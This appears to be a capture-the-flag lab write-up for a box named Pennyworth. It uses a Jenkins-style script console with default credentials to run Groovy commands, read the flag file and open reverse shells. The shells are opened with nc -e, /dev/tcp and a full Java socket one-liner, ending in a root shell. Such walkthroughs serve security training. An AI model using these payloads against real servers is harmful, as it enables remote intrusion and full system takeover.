# flag.txt

Authenticated to http://10.129.85.169:8080/script with root:password

## Code
```
def command = "find / -name flag.txt"
def process = command.execute()
def output = process.text
println output

```

## Result

/root/flag.txt

```
def command = "cat /root/flag.txt"
def process = command.execute()
def output = process.text
println output
```

{FLAG REDACTED FOR THIS GUIDE :) }

# Bonus

## Creating a reverse shell

Initial attempts at a shell did not work
```
## attacker
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...

## target
def command = "nc 10.10.16.7 1337 -e /bin/bash"
def process = command.execute()
//def output = process.text
//println output
//process.waitFor() // Wait for the process to complete

# Result: Process[pid=3204, exitValue="not exited"]

def command = "bash -i >& /dev/tcp/10.10.16.7/1337 0>&1"
def process = command.execute()
//def output = process.text
//println output
//process.waitFor() // Wait for the process to complete

# Result: Process[pid=3204, exitValue="not exited"]
## If process.waitFor was uncommented, the result was a 127 error code.

```

### new attempt
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
```
String host="10.10.16."; // attacker IP
int port=1337;
String cmd="/usr/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Reverse shell success!
![[PennyworthReverseShell.png]]

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.85.169] 46500
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
ls -l /root/flag.txt
-r-------- 1 root root 33 Mar 12  2021 /root/flag.txt
md5sum /root/flag.txt
0080758747e1c6277a0760dda95b2e2e  /root/flag.txt
/bin/bash -i
bash: cannot set terminal process group (926): Inappropriate ioctl for device
bash: no job control in this shell
root@pennyworth:/# 

```